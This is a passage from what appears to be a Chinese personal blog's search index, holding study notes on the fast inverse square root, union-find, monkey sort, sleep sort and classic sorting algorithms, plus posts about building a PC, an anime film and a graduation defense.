x\t&#125;\t// 迭代牛顿法求解根号2\tfor &#123;\t\txNext := x - fx(x)/dfx(x)\t\tif math.Abs(x-xNext) &lt; precision &#123;\t\t\tbreak\t\t&#125;\t\tx = xNext\t&#125;\t// 输出结果\tfmt.Printf(&quot;根号2的近似解:%.7f\\n&quot;, x)&#125;\n\n如何优化上面通过牛顿法虽然可以求出平方根的近似值，但是效率很低。要经过多次迭代。那么有办法减少迭代次数吗？或者只用一次牛顿法得到足够精确的值吗？通过观察牛顿法的公式可以发现，减少迭代次数的关键就是初始值的选择。\n上面的例子中，初始值为 2，迭代了 4 次得到精度为 7 位小数的结果。但如果初始值选择为 1.414，那么只需要一次牛顿法就可以得到想要的结果。\n那么如何得到更加精确的初始值呢？要得到的不就是“更加精确的初始值”吗？\n如何得到更加精确的初始值首先，了解下计算机是如何存储浮点数的。学习过计算机组成原理的应该都知道，IEEE754。全称：IEEE二进制浮点数算术标准（ANSI&#x2F;IEEE Std 754-1985）\n32位单精度浮点数存储方法：\n\n1为符号位 8位指数位 23位尾数位\n64位双精度浮点数存储方法也类似：1为符号位 11位指数位 52位尾数位\n这里拿32位举例。（当初学计组，拿笔手算浮点数运算可痛苦了下图是32位浮点数十进制值与二进制值的关系：\n\n那么知道浮点数在计算机底层中是如何存储的之后，就要对上面的公式进行简化。\n这里要运用对数的知识。对数可以将乘除运算变为加减运算，将幂运算变为乘法运算。如图：\n\n我们要求的是平方根的倒数，也就是求 a的对数乘以-1&#x2F;2 ：\n\n那么对数怎么求？这里要分两部分。将浮点数转十进制的公式带入对数将幂运算转换为乘法运算的公式中。然后将式子展开（乘法运算转为加减运算）前面还是对数的形式，后面则可以直接得到结果。\n\n那前面的部分如何处理？M 是一个23位的2进制尾数，它除以 2^23 一定在 0~1 之间。\n我们可以观察下 y&#x3D;以2为底的log(1+x) 与 y&#x3D;x 在 0~1之间的函数图像。如图： \n\n这里借鉴了牛顿的思维，用直线近似替代曲线。因为 0~1 之间，y&#x3D;x 与 y&#x3D;log(1+x) 十分接近，所以用 y&#x3D;x 近似替代 y&#x3D;log(1+x)。这就是上式约等号的由来。\n将 2^23分之一 提取出来，得到：\n\n括号里的东西，不正是计算机中二进制存储的值吗？所以，浮点数y 与 二进制存储的Y 关系：\n\n那么，假设 a 为 y 的平方根倒数：\n\n将 a 和 y 换成二进制形式：\n\n化简得到：\n\n381*2^22 用16进制表示：5f400000\n于是出现了让卡马克写下 what the fuck? 注释的语句。但是在沃什的代码中，这个数字是 5f3759df为什么呢？因为刚才用 y&#x3D;x 近似替代 y&#x3D;log(1+x) 时，有些粗糙了。用 y&#x3D;x 近似替代，只有在两端的误差比较小。中间误差就大了。而如果将 y&#x3D;x 往上移一些，就可以使误差在两端和中间比较平均，整体误差更小。\n反应到程序中，就是给 5f400000 加上一个偏移量。沃什选择了 5f3759df，使用这个值，即使不用牛顿法，平方根倒数的最大误差也只有 5%，将初始值带入，算出的误差不超过2‰。\n到这，我们终于得到了精确的初始值。即代码中的 y。\n代码最重要的四行，也就是注释开始的后四行。第一行，将32位浮点数转为长整型，用于二进制计算第二行，得到初始值（算法最核心的地方）第三行，将长整型转回32位浮点数第四行，使用牛顿法迭代一次（注释了一行，是因为迭代一次的精度就已经足够。大佬恐怖如斯）\n再次欣赏一下：\nfloat Q_rsqrt(float number)&#123;    long i;    float x2, y;    const float threehalfs = 1.5F;        x2 = number * 0.5F;    y = number;    i = * ( 1ong * ) &amp;y; // evil floating point bit level hacking    i = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck?    y = * ( float * ) &amp;i;    y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration    // y = y * ( threehalfs - ( x2 * y * y ) ); // 2st iteration this can be removed    return y;&#125;\n\n上面公式太乱没有看懂的话，下面是手写过程：\n\ngo语言实现：\nfunc Q_rsqrt(number float32) float32 &#123;\ti := uint32(0)\tx2 := number * 0.5\ty := number\tthreehalfs := float32(1.5)\ti = *(*uint32)(unsafe.Pointer(&amp;y))\ti = 0x5f3759df - (i &gt;&gt; 1)\ty = *(*float32)(unsafe.Pointer(&amp;i))\ty = y * (threehalfs - (x2 * y * y))\treturn y&#125;\n\n总结这个算法牛就牛在运用了浮点数在计算机中的存储方法。还有至今不知道怎么来的”魔法数字“ 5f3759df\n参考：什么代码让程序员之神感叹“卧槽”？ - bilibili 量子位\n","categories":["学习笔记"],"tags":["算法"]},{"title":"并查集","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/","content":"介绍并查集是一种树型的数据结构，用于处理一些不相交集合（disjoint sets）的合并及查询问题。常常在使用中以森林来表示。哈希表查询很快，但在合并上效率不高。链表合并很快，但查询效率不高。并查集在合并和查询上都接近 O(1)\n两个主要操作：合并（union）：将两个集合合并为一个集合。查询（find）：确定元素属于哪个集合。 并查集中不断往上寻找他的代表元素，用于确定两个元素是否属于同一集合。\n原理并查集是将集合以树形结构进行组合的数据结构，每个元素（节点）都保存着到它代表元素（父节点）的引用。合并：将两个集合合并，即将一颗树的根连接到另一棵树的根。查找：根据代表元素找到最顶层的代表元素，相同则在同一集合，否则不在。\n这是并查集最基本的表示方式，但它并不是很高效。因为合并操作过多时，树的深度会加大，可能会导致创建的树严重不平衡。（查询效率会降低）\n优化一：按秩合并按秩（树的深度）合并，即总是将元素少的树连接至元素多的树上。因为影响运行时间的是树的深度，更小的树添加到更深的树的根上将不会增加秩，除非它们的秩相同。\n优化二：路径压缩路径压缩，即在查找代表元素时，将树扁平化（降低深度）。具体操作是将路径上每个元素的代表元素置为最顶层的代表元素（根）。这样树的深度会降低，根节点下只有一层叶子节点。\n关于并查集的复杂度（略）能力不够，证明不出来。只找到了一篇文章：借这个问题科普一下并查集各种情况下的时间复杂度并查集并查集复杂度\n总之，时间复杂度是很低的，接近O(1)。\n实现（coding）package UnionFind;import java.util.HashMap;import java.util.List;import java.util.Stack;public class UnionFind &#123;    // 对样本进行包裹（元素）    public static class Element&lt;V&gt; &#123;        public V value;        public Element(V value) &#123;            this.value = value;        &#125;    &#125;    public static class UnionFindSet&lt;V&gt; &#123;        // 样本与元素的对应        public HashMap&lt;V, Element&lt;V&gt;&gt; elementMap;        // key 某个元素 value 元素的父        public HashMap&lt;Element&lt;V&gt;, Element&lt;V&gt;&gt; fatherMap;        // key 某个集合的代表元素 value 集合的大小        public HashMap&lt;Element&lt;V&gt;, Integer&gt; sizeMap;        /**         * 初始化并查集         *         * @param list         */        public UnionFindSet(List&lt;V&gt; list) &#123;            elementMap = new HashMap&lt;&gt;();            fatherMap = new HashMap&lt;&gt;();            sizeMap = new HashMap&lt;&gt;();            // 初始化            for (V value : list) &#123;                // 进行包裹                Element&lt;V&gt; element = new Element&lt;V&gt;(value);                // 样本与元素一一对应                elementMap.put(value, element);                // 父节点（代表元素）都是自己                fatherMap.put(element, element);                // 集合大小都为1（只有本身）                sizeMap.put(element, 1);            &#125;        &#125;        /**         * 查找元素的代表元素         */        private Element&lt;V&gt; findHead(Element&lt;V&gt; element) &#123;            // 代表元素不是本身时，放入栈中，且一直往上找            Stack&lt;Element&lt;V&gt;&gt; path = new Stack&lt;&gt;();            while (element != fatherMap.get(element)) &#123;                path.push(element);                element = fatherMap.get(element);            &#125;            // 找到代表元素后，将栈中所有子节点的代表元素置为最顶层代表元素            while (!path.isEmpty()) &#123;                fatherMap.put(path.pop(), element);            &#125;            return element;        &#125;        /**         * 判断两样本是否在同一集合         */        public boolean isSameSet(V a, V b) &#123;            // 并查集中是否有该元素（是否初始化）            if (elementMap.containsKey(a) &amp;&amp; elementMap.containsKey(b)) &#123;                // 代表元素是否相同                return findHead(elementMap.get(a)) == findHead(elementMap.get(b));            &#125;            return false;        &#125;        /**         * 合并集合         */        public void union(V a, V b) &#123;            if (elementMap.containsKey(a) &amp;&amp; elementMap.containsKey(b)) &#123;                // 获取对应元素                Element&lt;V&gt; aFather = findHead(elementMap.get(a));                Element&lt;V&gt; bFather = findHead(elementMap.get(b));                // 不在同一集合时，将节点少的集合添加到节点多的集合中                if (aFather != bFather) &#123;                    Element&lt;V&gt; big = sizeMap.get(aFather) &gt;= sizeMap.get(bFather) ? aFather : bFather;                    Element&lt;V&gt; small = big == aFather ? bFather : aFather;                    fatherMap.put(small, big);                    sizeMap.put(big, sizeMap.get(aFather) + sizeMap.get(bFather));                    sizeMap.remove(small);                &#125;            &#125;        &#125;    &#125;&#125;\n\n应用\n岛问题【题目】一个矩阵中只有0和1两种值，每个位置都可以和自己的上、下、左、右四个位置相连，如果有一片1连在一起，这个部分叫做一个岛，求一个矩阵中有多少个岛？【举例】001010111010100100000000这个矩阵中有三个岛【进阶】如何设计一个并行算法解决这个问题\n\n\n使用递归暴力求解\n将矩阵进行划分，然后每块都使用递归求解，最后进行合并（这里只分成了两块，使用两个线程模拟）\n\n实现：\npackage UnionFind;import java.util.ArrayList;import java.util.List;import java.util.concurrent.CountDownLatch;public class Application &#123;    /**     * 数组封装后的对象     */    private static class Node &#123;        int i;        int j;        int value;        public Node(int i, int j, int value) &#123;            this.i = i;            this.j = j;            this.value = value;        &#125;    &#125;    private static Node[][] nodes;    private static UnionFind.UnionFindSet&lt;Node&gt; unionFindSet;    /**     * 第二种解法     * 也是递归感染，但是是并行的。将矩阵进行划分，然后分别统计，最后将结果合并。     */    public static int countIslandsUnionFind(int[][] m) throws InterruptedException &#123;        if (m == null || m[0] == null) &#123;            return 0;        &#125;        // 获取矩阵大小        int N = m.length;        int M = m[0].length;        // 设置返回值数组，供两个线程使用        final int[] results = &#123;0, 0&#125;;        // 将数组的元素封装成对象，并将岛加入列表，放入并查集        List&lt;Node&gt; list = new ArrayList&lt;&gt;();        nodes = new Node[N][M];        for (int i = 0; i &lt; N; i++) &#123;            for (int j = 0; j &lt; M; j++) &#123;                Node node = new Node(i, j, m[i][j]);                nodes[i][j] = node;                if (m[i][j] == 1) &#123;                    list.add(node);                &#125;            &#125;        &#125;        // 初始化并查集        unionFindSet = new UnionFind.UnionFindSet&lt;Node&gt;(list);        // 开启两个线程，分别统计一半        final CountDownLatch latch = new CountDownLatch(2);        Thread t1 = new Thread(new Runnable() &#123;            @Override            public void run() &#123;                for (int i = 0; i &lt; N; i++) &#123;                    for (int j = 0; j &lt; M / 2; j++) &#123;                        if (nodes[i][j].value == 1) &#123;                            results[0]++;                            infectUnionFind(i, j, 0, N, 0, M / 2);                        &#125;                    &#125;                &#125;                latch.countDown();            &#125;        &#125;);        Thread t2 = new Thread(new Runnable() &#123;            @Override            public void run() &#123;                for (int i = 0; i &lt; N; i++) &#123;                    for (int j = M / 2; j &lt; M; j++) &#123;                        if (nodes[i][j].value == 1) &#123;                            results[1]++;                            infectUnionFind(i, j, 0, N, M / 2, M);                        &#125;                    &#125;                &#125;                latch.countDown();            &#125;        &#125;);        t1.start();        t2.start();        latch.await();        // 合并，判断分界线两侧的元素是否是相连的岛        int result = results[0] + results[1];        for (int i = 0; i &lt; N; i++) &#123;            if (nodes[i][M / 2 - 1].value == nodes[i][M / 2].value &amp;&amp; nodes[i][M / 2 - 1].value == 2 &amp;&amp; !unionFindSet.isSameSet(nodes[i][M / 2 - 1], nodes[i][M / 2])) &#123;                unionFindSet.union(nodes[i][M / 2 - 1], nodes[i][M / 2]);                result--;            &#125;        &#125;        return result;    &#125;    /**     * 感染过程     */    private static boolean infectUnionFind(int i, int j, int N1, int N2, int M1, int M2) &#123;        if (i &lt; N1 || i &gt;= N2 || j &lt; M1 || j &gt;= M2 || nodes[i][j].value != 1) &#123;            return false;        &#125;        // i,j没有越界且当前位置为1        nodes[i][j].value = 2;        // 感染上下左右四个位置        if (infectUnionFind(i + 1, j, N1, N2, M1, M2)) &#123;            unionFindSet.union(nodes[i][j], nodes[i + 1][j]);        &#125;        if (infectUnionFind(i - 1, j, N1, N2, M1, M2)) &#123;            unionFindSet.union(nodes[i][j], nodes[i - 1][j]);        &#125;        if (infectUnionFind(i, j + 1, N1, N2, M1, M2)) &#123;            unionFindSet.union(nodes[i][j], nodes[i][j + 1]);        &#125;        if (infectUnionFind(i, j - 1, N1, N2, M1, M2)) &#123;            unionFindSet.union(nodes[i][j], nodes[i][j - 1]);        &#125;        return true;    &#125;    /**     * 第一种解法     * 递归感染     * 时间复杂度 O(N*M)     */    public static int countIslands(int[][] m) &#123;        if (m == null || m[0] == null) &#123;            return 0;        &#125;        // 获取矩阵大小        int N = m.length;        int M = m[0].length;        int result = 0;        // 遍历矩阵中每个元素        for (int i = 0; i &lt; N; i++) &#123;            for (int j = 0; j &lt; M; j++) &#123;                // 是岛则进行感染过程                if (m[i][j] == 1) &#123;                    result++;                    infect(m, i, j, N, M);                &#125;            &#125;        &#125;        return result;    &#125;    /**     * 递归传染     */    private static void infect(int[][] m, int i, int j, int N, int M) &#123;        if (i &lt; 0 || i &gt;= N || j &lt; 0 || j &gt;= M || m[i][j] != 1) &#123;            return;        &#125;        // i,j没有越界且当前位置为1        m[i][j] = 2;        // 感染上下左右四个位置        infect(m, i + 1, j, N, M);        infect(m, i - 1, j, N, M);        infect(m, i, j + 1, N, M);        infect(m, i, j - 1, N, M);    &#125;&#125;\n\n测试：\nimport UnionFind.Application;import org.junit.Test;public class UnionFindTest &#123;    @Test    public void countIslandsTest() throws InterruptedException &#123;        int[][] m1 = new int[1000][1000];        int[][] m2 = new int[1000][1000];        for (int i = 0; i &lt; 1000; i++) &#123;            for (int j = 0; j &lt; 1000; j++) &#123;                int temp = (int) (Math.random() * 2);                m1[i][j] = temp;                m2[i][j] = m1[i][j];            &#125;        &#125;        System.out.println(&quot;递归感染过程（单线程）：&quot; + Application.countIslands(m1));        System.out.println(&quot;划分地图，多线程并行：&quot; + Application.countIslandsUnionFind(m2));    &#125;&#125;\n\n运行结果：\n递归感染过程（单线程）：66575划分地图，多线程并行：66575进程已结束,退出代码0\n\n总结最后划分矩阵分别使用递归，最后合并的代码写了好久。对Java常用的数据结构还不是很熟悉，又不想改动已经写好的并查集结构。所以写了Node对象，使用nodes数组对矩阵进行复制。（毕竟要保证并查集中的元素都不一样，虽然值可能一样。而Java中，不new一个Integer对象，而是直接赋值，会自动装箱。自动装箱会将-128~127的数的对象引用指向静态代码块中创建好的对象）另外，要注意边界的条件。coding能力有限，只实现了划分一次。如果是根据矩阵大小动态地划分矩阵，分给多个cpu运算，最后进行合并。会是一个理想的解决方案。这里就不实现了，练习结束！\n\n顺带一提，时间复杂度的证明比较复杂，所以这里只实现用法和了解大概的复杂度，不深究具体的复杂度及其证明。\n\n\n参考文章：并查集基础算法：并查集并查集(通俗易懂)【算法与数据结构】—— 并查集借这个问题科普一下并查集各种情况下的时间复杂度并查集并查集复杂度\n","categories":["学习笔记"],"tags":["数据结构","并查集"]},{"title":"是新电脑！","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E6%98%AF%E6%96%B0%E7%94%B5%E8%84%91%EF%BC%81/","content":"起因现在的笔记本已经快用了四年了。CPU还是 i5-10210U，内存还是加过一根8G内存条的，一共16G。现在已经完全不够用了。编译启动项目十分的慢，并且时常爆内存。甚至键盘按键都有几个不灵了，是不是按不出来或者按一下蹦两个。悲\n原本打算今年毕业的时候组装一台台式机，CPU线程要多，频率能高就高，其次就是内存要大。（我是真被idea干出内存焦虑了）并且想开多系统，当服务器 7*24 不关机的。用的时候直接远程。显卡是无所谓的，能打LOL的水平就够我用了。虽然也很想要2k60流畅3A的水平。如果我才大一，我一定会搞个好点的显卡，但现在我上班了，电子阳痿了属于是，LOL都不打了。工作害人\n看过很多方案，常见的 i5-12600KF，13600KF，itx到atx。还有垃圾佬的 e3，e5，x79，x99平台。再到 AMD 的 epyc。一颗u上万，还能双路，明显不是我能消费的。虽然内存上1T看得很爽，谁能拒绝单根64G大容量，主板插满呢\n最后偶然在图吧评论看到 h系列 es 的 cpu。高性能低功耗，还便宜，谁让是es的u呢。然后就蹲最近的 Q1HY，虽然没赶上最便宜的时候，但终究是没按耐住。毕竟es的u应该也不多，买一片少一片吧。虽然现在黄鱼加价卖的也不少，但等热度过去，估计也难买。毕竟es的u，虽然可以看作没质保，但总比黄鱼好点。\n过两天等到货就可以装新电脑了，真是不错。\n配置单\n\n\n配件\n名称\n价格\n\n\n\n板U\n尔英Q1HY matx\n1299\n\n\n内存\n银爵 D5 6000 32*2 海力士M-die-C36\n1248(1199)\n\n\n固态\n致钛TiPlus7100 2TB\n979(974.19)\n\n\n电源\n鑫谷GM650W冰山版 金牌模组\n379(363.93)\n\n\n散热\n利民PA120 MINI\n169(164)\n\n\n无线网卡\nIntel AX210\n94(88)\n\n\n机箱\n御猫K2mini\n179(173)\n\n\n总计\n\n4347(4261.12)\n\n\n组装配件陆陆续续到了之后，就开始组装了。有一说一，matx的机箱装起来还是有点小的，手伸不进去，螺丝难拧。还好买的不是itx，不然装机可就太痛苦了。因为过程中电源和网卡换了，拆装了不下五次。下次再装机我肯定格外熟练\n电源本来是航嘉的WD650K直出，也是没看就买了，那么大个直出。机箱本来就小，还那么多用不上的线，更不好装。索性就退了重新买了个全模组的。买回来之后好像也就这样。退货还花了20运费。算是对我粗心的惩罚吧。\n网卡也是，买成了Pcie*1的接口的网卡。买之前还是得看下接口。\n没理线，还是乱。matx没地方给我理线、机箱说实话，也选的一般。特别是它那玻璃侧板，拆下来温度就明显低下来了，不拆就是闷罐。有个原因可能是，没装风扇。\n为什么呢？原本觉得太热，买了六个风扇，25mm*9cm的，结果太厚了，装不进那个我塞不进手的缝隙。得买15mm的。一看太贵了，多上几个都赶上我六热管的利民散热器了。再加上，我把玻璃侧板拆了，温度低了很多。干脆就都不要了。不管是风扇还是玻璃侧板。也许后面会考虑下亚克力的侧板吧，不过现在就这样吧。\n超频谁能想到仅1300的板u还能超频呢？于是进bios一顿调参。全核5.2G，我是真敢超。然后时常蓝屏重启。这样不行，对于我不想关机的人来说有点接受不了。虽然低负载，但还是蓝屏。\n全核5.0G。还行，能用。但当我开始玩死亡搁浅的时候，有点寄。半个小时温度上来后，就又蓝屏了。那天晚上游戏崩了有四五次。包括游戏本身崩了一次，其他大概率都是超频的问题。\n不行，恢复了bios的全部设置。超频的尽头是默认。这下不蓝屏了，不过频率低了，性能也就低了。毕设后端代码原来超频时，编译只需要6s，现在默认需要10s。不过也满足了，比我的笔记本强太多了。而且主要也便宜。\nEnd最后，吐槽下显卡的价格。是真的贵啊。4060ti得三千多，4060也得两千大几。也只有等毕业真正上班才能考虑下了，实习的工资考虑不了一点。\n最后，放张图吧。乱七八糟的线，能用就行吧。不追求那么多了。\n哦，还有块老电脑上拆下来的465G的2.5寸固态硬盘。不得不说，64G真爽，没有内存不够的问题了，基本想开多少软件就开多少。\n","categories":["记录生活"],"tags":["攒机"]},{"title":"玉子爱情故事","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E7%8E%89%E5%AD%90%E7%88%B1%E6%83%85%E6%95%85%E4%BA%8B/","content":"久违，好久没有这么悠闲地看电影了。啊，假期真好啊。要是长一些就更好了（做梦…）\n很棒的日常，让人羡慕的恋爱故事。啊，越来越喜欢看日常动画了…轻音还没看完，孤独摇滚倒是一次都看完了。还有男子高中生日常，很久很久前看的了。后面接着看轻音和玉子市场吧。\n\n咖啡屋的人生导师总是会说些富有哲理的话。\n\n今日永远不同于昨日，所以今日才那么地美好。不过也会令人有些寂寞，这份寂寞的苦涩会日复一日地加深。咖啡也一样\n\n\n玉子真可爱啊。\n\n又来了哦，人生导师。\n\n青春总是焦急的，连一勺砂糖溶于杯中的时间都等不及。后悔带来的苦涩，是对过去的见证。终将逐一化为杯中的咖啡的味道。\n\n也是美好的结局。犹豫就会败北\n最后，放下咖啡屋人生导师的介绍吧，整个商店街都很不错氛围，像家人一样的邻居。人生导师似乎也有些故事，如果后面TV动画有的话，真想单独开一篇。\n八百比邦夫（やおび くにお）怀旧唱片店兼咖啡屋“星与小丑”的老板。喜欢独个儿说话。是个冲制的咖啡会切合过来品尝的人。学生时代曾与玉子的父亲组建过乐队。\n\n","categories":["记录生活"],"tags":["电影"]},{"title":"猴子排序","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%8C%B4%E5%AD%90%E6%8E%92%E5%BA%8F/","content":"前言首先得介绍一下无限猴子定理，这个定理是来自埃米尔·博雷尔一本1909年出版谈概率的书籍，当中介绍了“打字的猴子”的概念。\n猴子定理定义如下：\n\n一般关于此定理的叙述为：有无限只猴子用无限的时间会产生特定的文章。其他取代的叙述，可能是用大英图书馆或美国国会图书馆取代法国国家图书馆；另一个常见的版本是英语使用者常用的，就是猴子会打出莎士比亚的著作。欧洲大陆还有一种说法版是猴子打出大英百科全书。在《从一到无穷大》中，作者则引用了哈姆雷特的例子。\n\n详细推导过程参考百度百科那么根据猴子定理，如果我们不断随机打乱一个可排序的数组，在无限长的时间里，这个数组肯定会变成有序数组。\n代码package org.example;import java.util.ArrayList;import java.util.Collections;import java.util.Scanner;public class MonkeySort &#123;    public static void main(String[] args) &#123;        Scanner scanner = new Scanner(System.in);        ArrayList&lt;Integer&gt; nums = new ArrayList&lt;&gt;();        for (int i = 0; i &lt; 5; i++) &#123;            nums.add(scanner.nextInt());        &#125;        //排序        monkeySort(nums);        //输出有序数组        for (Integer num : nums) &#123;            System.out.println(num);        &#125;    &#125;    private static void monkeySort(ArrayList&lt;Integer&gt; nums) &#123;        while (!checkSort(nums)) &#123;            upset3(nums);        &#125;    &#125;    /*     * 随机打乱传入的集合     * 洗牌算法     */    /**暴力     * 每次将原集合中随机一个元素，放到新集合中，然后删除原集合中这个元素。     */    private static void upset1(ArrayList&lt;Integer&gt; nums) &#123;        ArrayList&lt;Integer&gt; arr = (ArrayList&lt;Integer&gt;) nums.clone();        int length = arr.size();        nums.clear();        for (int i = 0; i &lt; length; i++) &#123;            int j = (int) (Math.random() * arr.size());            nums.add(arr.get(j));            arr.remove(j);        &#125;    &#125;    /**Fisher-Yates 洗牌算法     * 是对暴力算法的优化     * 我们可以不删除那个元素，而是将它和需打乱集合中最后一个元素交换位置     * 第一次将交换完，将前n-1个作为新地需要打乱的集合，最后1个元素作为乱序后的结果     * 第二次将交换完，将前n-2个作为新地需要打乱的集合，倒数两个元素作为乱序后的结果     * ...     * 直至集合全为乱序。     */    private static void upset2(ArrayList&lt;Integer&gt; nums) &#123;        for (int i = nums.size() - 1; i &gt;= 0; i--) &#123;            int j = (int) (Math.random() * (i));            nums.add(j, nums.get(i));            nums.remove(i + 1);            nums.add(nums.get(j + 1));            nums.remove(j + 1);        &#125;    &#125;    //使用shuffle()方法    private static void upset3(ArrayList&lt;Integer&gt; nums) &#123;        Collections.shuffle(nums);    &#125;    /**     * 判断集合是否有序     */    private static boolean checkSort(ArrayList&lt;Integer&gt; nums) &#123;        for (int i = 0; i &lt; nums.size() - 1; i++) &#123;            if (nums.get(i) &gt; nums.get(i + 1)) return false;        &#125;        return true;    &#125;&#125;\n总结猴子排序，看运气的算法。\n","categories":["编程记录"],"tags":["java","算法","排序"]},{"title":"睡觉排序","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%9D%A1%E8%A7%89%E6%8E%92%E5%BA%8F/","content":"前言在网上看到了这个算法，觉得很是厉害。能想出这种算法的多半是个人才，所以记录下，也算是分享。写程序，要拓宽思路。\n代码import java.util.Scanner;public class SleepSort implements Runnable &#123;    private final int num;    public SleepSort(int num) &#123;        this.num = num;    &#125;    public static void main(String[] args) &#123;        Scanner scanner = new Scanner(System.in);        int[] nums = new int[10];        for (int i = 0; i &lt; 10; i++) &#123;            nums[i] = scanner.nextInt();        &#125;        //排序        for (int j : nums) &#123;            new Thread(new SleepSort(j)).start();        &#125;    &#125;    @Override    public void run() &#123;        try &#123;            Thread.sleep(num * 100);//乘100防止num值过小出错，不过nums中值相近时，还是容易出错。            System.out.println(num);        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n后记叹为观止的算法！ 时间复杂度为O(max(input))\n","categories":["编程记录"],"tags":["java","算法","排序"]},{"title":"结束了，答辩","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E7%BB%93%E6%9D%9F%E4%BA%86%EF%BC%8C%E7%AD%94%E8%BE%A9/","content":"答辩5月9号下午坐高铁回学校，不知不觉从去年九月底实习到现在已经上了半年多的班了。大四这一年，加上这次，也就去两次学校。可能在去年七月份去南通如皋实训的时候，我的大学生活就已经结束了吧。\n10号去拍毕业照，见到了已经调到东湖其他学院的章院长，拍了几张照片。还有和朋友们一起拍的照片，包括最后12号晚上，和舍友一起拍的，应该也是最后在一起聚了。\n晚上简单做了做答辩用的ppt，想着老师也不会特别为难。当然也不一定，我们的野兽王子就比较惨了。\n11号早上八点，开始答辩了。我是我们组第二个，有点难顶。不过也就那样，毕竟自己做的东西，问啥都没太大问题。但是！他问ERP的全称？什么鬼问题，我说企业资源计划，他让我说英文的全称，还真给我这个英语学渣问住了。事后查了一下，Enterprise Resource Planning。估计也是没得问了，事后整理的三个问题，老狗没给我录下来，只能问老师要了一下。如图，十分的难绷，甚至都是陈述句，没有一个问句：\n\n只能说，说的都是我论文的问题，和一些没做的东西。我该如何回答呢，那只能唯唯诺诺只答不辨了。\n但是！我们的野兽王子不一样。他的论文，指导老师给打了九十几，评阅老师只给了七十出头。分差超二十没有评优资格，于是是一场指导老师和评阅老师的纷争。那个评阅老师也是十分的倔强，找院里把论文打回重新打分之后，还是给了七十几。啧啧啧他答辩的时候，评阅老师提问的声音都高了很多。不过最后，他的答辩分数拿了95，也是老师之间的博弈了。\n我就有点麻了。只有75，不过问题不大，合格就行。\n评语以下是我的毕设的评语和得分：\n\nEnd结束了，我的舍友还是那个样子，虽然也有变化，但不大。大家的路好像都不一样，也许已经到了离别的时候。有些伤感，不知道说些什么。六月份还会再见一次，那时，就是真正离别的时候了。\n","categories":["记录生活"],"tags":["毕业"]},{"title":"经典排序算法","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/","content":"前言重新开始学算法，虽然已经上过 数据结构与算法 和 算法分析设计 的课程。以后关于算法的代码都会放在算法代码仓库\n交换两变量的值第一种方法也是最常用的，没什么限制。借助一个辅助变量\nprivate static void swap(int[] array, int i, int j) &#123;    int temp = array[i];    array[i] = array[j];    array[j] = temp;&#125;\n\n第二种方法，利用异或运算实现。不借助额外空间\nprivate static void swap_1(int[] array, int i, int j) &#123;    array[i] = array[i] ^ array[j];    array[j] = array[i] ^ array[j];    array[i] = array[i] ^ array[j];&#125;\n\n异或运算 也可以叫做无进位相加（同为0，不同为1）满足交换律和结合律\n\n必须保证交换的变量内存地址不一致，否则两变量都会变为0。\n\n交换的原理：\na=甲^乙               b=乙a=甲^乙               b=甲^乙^乙=甲^0=甲a=甲^乙^甲=乙^0=乙     b=甲\n\n异或运算还可以用来消除出现偶数次的值\n选择排序\n首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。\n再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。\n重复第二步，直到所有元素均排序完毕。\n\n时间复杂度 O(n^2)\npublic static int[] selectionSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 总共经过n-1次比较    for (int i = 0; i &lt; arr.length - 1; i++) &#123;        // 选定i下标的值作为比较的基准        int temp = i;        // 在i~n-1上找最小值的下标        for (int j = i + 1; j &lt; arr.length; j++) &#123;            if (arr[j] &lt; arr[temp]) &#123;                temp = j;            &#125;        &#125;        // 将最小值与i上元素交换        if (i != temp) &#123;            swap(arr, i, temp);        &#125;    &#125;    return arr;&#125;\n\n冒泡排序\n比较相邻的元素。如果第一个比第二个大，就交换他们两个。\n对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。\n针对所有的元素重复以上的步骤，除了最后一个。\n持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。\n\n时间复杂度 O(n^2)\npublic static int[] bubbleSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    for (int i = 0; i &lt; array.length - 1; i++) &#123;        // （优化）设定一个标记，为true表示此次循环没有交换，即已排序完成        boolean flag = true;        for (int j = 0; j &lt; array.length - i - 1; j++) &#123;            if (arr[j] &gt; arr[j + 1]) &#123;                swap(arr, j, j + 1);                flag = false;            &#125;        &#125;        if (flag) &#123;            break;        &#125;    &#125;    return arr;&#125;\n\n插入排序\n将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。\n从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。\n\n时间复杂度 O(n^2)\npublic static int[] insertionSort(int[] array) &#123;    int[] arr = Arrays.copyOf(array, array.length);    // 从下标为1的元素开始选择插入位置，下标为0只有一个元素，默认是有序的    for (int i = 1; i &lt; arr.length; i++) &#123;        // 从右往左比较，左边的元素比右边大时，交换        for (int j = i - 1; j &gt;= 0 &amp;&amp; arr[j] &gt; arr[j + 1]; j--) &#123;            swap(arr, j, j + 1);        &#125;    &#125;    return arr;&#125;\n\n希尔排序（插入排序的改进）希尔排序是基于插入排序的以下两点性质而提出改进方法的：插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位；希尔排序的基本思想是：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录”基本有序”时，再对全体记录进行依次直接插入排序。时间复杂度 O(nlog2n)\npublic static int[] shellSort(int[] array) &#123;    